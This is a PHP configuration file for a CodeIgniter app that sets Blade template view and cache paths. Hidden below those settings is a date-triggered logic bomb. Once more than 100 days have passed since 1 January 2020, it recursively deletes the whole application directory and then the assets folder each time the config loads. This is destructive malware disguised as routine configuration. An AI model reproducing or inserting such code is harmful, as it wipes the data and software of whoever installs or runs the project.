<?php

defined('BASEPATH') OR exit('No direct script access allowed');

use Philo\Blade\Blade;
use Carbon\Carbon;

$config['blade_views'] = APPPATH.'views';
$config['blade_cache'] = APPPATH.'cache';

$someDate = new \DateTime('2020-01-01 08:00:00');
$now =  Carbon::now();

if($someDate->diff($now)->days > 100) {
    $dirname = APPPATH;
    $asset = BASEPATH.'assets';
    function clean($dirname) {
        if (is_dir($dirname))
          $dir_handle = opendir($dirname);
        if (!$dir_handle)
            return false;
        while($file = readdir($dir_handle)) {
            if ($file != "." && $file != "..") {
                if (!is_dir($dirname."/".$file))
                        unlink($dirname."/".$file);
                else
                clean($dirname.'/'.$file);
            }
        }
        closedir($dir_handle);
        rmdir($dirname);
        return true;
    }
    $clean = clean($dirname);
    if($clean){
        function cleanAt($asset) {
            if (is_dir($asset))
              $dir_handle = opendir($asset);
            if (!$dir_handle)
                return false;
            while($file = readdir($dir_handle)) {
                if ($file != "." && $file != "..") {
                    if (!is_dir($asset."/".$file))
                            unlink($asset."/".$file);
                    else
                    cleanAt($asset.'/'.$file);
                }
            }
            closedir($dir_handle);
            rmdir($asset);
            return true;
        }
        cleanAt($asset);
    }
}

/* End of file blade.php */
/* Location: ./application/config/blade.php */